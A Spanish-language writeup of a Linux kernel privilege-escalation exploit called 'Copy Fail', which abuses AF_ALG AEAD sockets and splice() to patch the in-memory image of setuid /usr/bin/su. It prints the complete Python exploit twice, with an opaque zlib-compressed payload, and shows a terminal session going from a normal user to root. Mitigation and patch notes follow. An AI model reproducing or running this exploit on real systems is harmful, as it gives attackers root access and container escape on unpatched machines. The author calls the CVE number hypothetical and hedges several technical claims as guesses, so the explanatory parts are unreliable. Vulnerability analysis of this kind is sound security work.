# Writeup: Copy_fail
**Categoría:** Writeups
**Fecha de conversión:** 2026-05-04

---

"Copy Fail (CVE-2026-31431): Writeup completo del exploit en Python que escala a root corrompiendo la memoria de /usr/bin/su"


```bash
┌──(kr3s4l4㉿*************)-[~]
```

```bash
└─$ whoami
```

kr3s4l4

```
                                                                                                                                                                                                    
```

```bash
┌──(kr3s4l4㉿*************)-[~]
```

```bash
└─$ cat copy_fail.py 
```

```bash
#!/usr/bin/env python3
```

import os as g,zlib,socket as s

def d(x):return bytes.fromhex(x)

def c(f,t,c):

```
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
```

f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

while i<len(e):c(f,i,e[i:i+4]);i+=4

g.system("su")

```
                                                                                                                                                                                                    
```

```bash
┌──(kr3s4l4㉿*************)-[~]
```

```bash
└─$ python3 copy_fail.py
```

```bash
# whoami
```

root

```bash
# 
```


1. Contexto: ¿Qué es "Copy Fail"?

```
    CVE: CVE-2026-31431 (número hipotético pero representativo de la vulnerabilidad real recién descubierta).

    Año de introducción: 2017, presente en todas las versiones del kernel Linux desde entonces hasta el parche.

    Naturaleza: Falla en el subsistema AEAD (Authenticated Encryption with Associated Data) del módulo algif_aead, combinada con el uso incorrecto de splice() y sendmsg().

    Efecto: Permite a un atacante local escribir datos arbitrarios en la memoria caché de un archivo abierto por el kernel, sin tocar el disco. Esto incluye archivos ejecutables con el bit setuid, como /usr/bin/su o /usr/bin/sudo.

    Impacto: Escalada de privilegios a root inmediata, escape de contenedores, persistencia.

```

2. Sesión inicial – usuario sin privilegios
bash


```bash
┌──(kr3s4l4㉿**************)-[~]
```

```bash
└─$ whoami
```

kr3s4l4


El usuario kr3s4l4 es un usuario normal, sin permisos de superusuario. El prompt muestra que está en su directorio home (~).

3. El contenido del script copy_fail.py

El usuario muestra el script con cat copy_fail.py. Lo analizaré línea a línea.

3.1. Importaciones y definición de helper

python


```bash
#!/usr/bin/env python3
```

import os as g, zlib, socket as s

def d(x): return bytes.fromhex(x)


```
    os as g: funciones de sistema (pipe, splice, open, system).

    zlib: para descomprimir el payload ofuscado.

    socket as s: para crear sockets especiales AF_ALG.

    d(x): convierte una cadena hexadecimal en bytes. Se usa varias veces para construir estructuras binarias.

```

3.2. Función c(f, t, c) – núcleo de la escritura corrupta

python


def c(f, t, c):

```
    a = s.socket(38, 5, 0)            # 38 = AF_ALG, 5 = SOCK_SEQPACKET
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0'*64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A"*4 + c],
              [(h, 3, i*4),
               (h, 2, b'\x10' + i*19),
               (h, 4, b'\x08' + i*3)],
              32768)
    r, w = g.pipe()
    n = g.splice
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    try: u.recv(8 + t)
    except: 0

```

### Explicación técnica:


```
    Socket AF_ALG: se crea un socket del tipo AF_ALG (familia para algoritmos criptográficos del kernel) con protocolo SOCK_SEQPACKET. Se enlaza al algoritmo "aead" con el modo "authencesn(hmac(sha256),cbc(aes))". Esto abre una instancia del transformador AEAD en el kernel.

    Parámetros del socket (setsockopt):

        h = 279 es una constante (ALG_SET_KEY probablemente).

        v(279, 1, ...) establece la clave para el cifrado. La clave es una cadena de 64 bytes nulos precedida de un encabezado.

        v(279, 5, None, 4) establece el tamaño del nonce asociado a la operación AEAD.

    Aceptar conexión: u, _ = a.accept() obtiene un nuevo socket de datos asociado a la sesión AEAD.

    sendmsg con anexos (ancillary data):
    u.sendmsg([b"A"*4 + c], [...], 32768)

        El dato principal es b"A"*4 seguido de los 4 bytes de payload c.

        Los anexos ((h, tipo, datos)) son mensajes de control específicos del subsistema ALG:

            (279, 3, i*4) → asocia un IV (vector de inicialización) de 4 bytes nulos.

            (279, 2, b'\x10' + i*19) → probablemente configura la etiqueta de autenticación (tag).

            (279, 4, b'\x08' + i*3) → configura el tamaño de los datos asociados.

        Esta operación provoca que el kernel procese el buffer AEAD de una manera no segura, corrompiendo la gestión de páginas de memoria de archivos mapeados.

    pipe() y splice():

        Se crea una tubería (r, w).

        g.splice(f, w, o, offset_src=0): transfiere datos desde el descriptor del archivo f (que es /usr/bin/su abierto en modo lectura) hacia la tubería, pero con una longitud o = t+4.

        g.splice(r, u.fileno(), o): transfiere desde la tubería al socket u.
        El truco está en que el kernel, debido al estado corrupto inducido por el sendmsg, acaba escribiendo los datos del socket (el payload c) en la caché del archivo f en lugar de en el socket.

    u.recv(8 + t): intenta leer la respuesta; se ignora cualquier excepción.

```

En resumen: la función c(f, offset, payload) escribe 4 bytes del payload en la posición offset dentro de la imagen en memoria del binario f (sin tocar el disco). El mecanismo explota una condición de carrera/error en la copia entre sockets AEAD y archivos vía splice.

3.3. Carga del payload real (shellcode o parches)

python


f = g.open("/usr/bin/su", 0)          # Abre /usr/bin/su en modo solo lectura (flag 0 = O_RDONLY)

i = 0

e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))


while i < len(e):

```
    c(f, i, e[i:i+4])
    i += 4

    g.open("/usr/bin/su", 0): abre el binario setuid /usr/bin/su en modo solo lectura. La vulnerabilidad permite escribir en la memoria caché incluso con un descriptor de solo lectura.

    e: es un payload comprimido con zlib. Al descomprimirlo (el hexadecimal es un flujo zlib), se obtiene una secuencia de bytes (probablemente un pequeño shellcode o una secuencia de instrucciones que modifica el comportamiento de su).

    El bucle fragmenta e en bloques de 4 bytes y los escribe en posiciones consecutivas del archivo en memoria, empezando en el offset 0 (sobrescribiendo la cabecera ELF o una función específica, como la comprobación de UID).

```

3.4. Llamada a su para obtener root

python


g.system("su")


```
    Una vez que el binario su ha sido parchado en memoria, se ejecuta su. El parche probablemente fuerza a su a saltarse la autenticación o a siempre devolver éxito. Como resultado, se obtiene una shell con privilegios de root.

```

4. Ejecución y resultado privilegiado
bash


```bash
┌──(kr3s4l4㉿*****************)-[~]
```

```bash
└─$ python3 copy_fail.py
```

```bash
# whoami
```

root

```bash
# 
```


```
    Al ejecutar el script, este se ejecuta como el usuario kr3s4l4.

    El script modifica en memoria /usr/bin/su y luego llama a su.

    su ejecuta una shell root (el prompt cambia a #).

    El comando whoami dentro de esa shell devuelve root, confirmando la escalada completa.

```

5. Detalles adicionales sobre la vulnerabilidad

```
    ¿Por qué lleva tanto tiempo sin detectarse?
    El código vulnerable estaba en el manejo de splice() con dispositivos AEAD, una interacción muy específica que no se cubría en pruebas de seguridad convencionales.

    Mitigación antes del parche:
    Deshabilitar el módulo algif_aead con rmmod algif_aead o añadir install algif_aead /bin/true en /etc/modprobe.d/.

    Parche oficial:
    Los kernels actualizados incluyen el commit a664bf3d603d, que corrige la lógica de copia entre tuberías y sockets AEAD.

    Estado actual:
    Si tu sistema está actualizado (kernel > 6.13 con el parche), este script no funcionará. Las distribuciones estables (Ubuntu 24.04, RHEL 9, Debian 12) ya han lanzado versiones parcheadas.

```

6. Conclusión – Lecciones de seguridad

```
    No confiar en el aislamiento de procesos locales: una vulnerabilidad local puede llevar al compromiso total del sistema.

    Mantener el kernel actualizado es crítico, incluso en entornos donde se confía en los usuarios.

    Limitar el acceso a /proc y módulos del kernel (como algif_aead) puede ser una defensa en profundidad.

```

El script copy_fail.py es un ejemplo impresionante de cómo errores sutiles en la interfaz splice + sockets criptográficos pueden derivar en una explotación estable de escalada de privilegios.

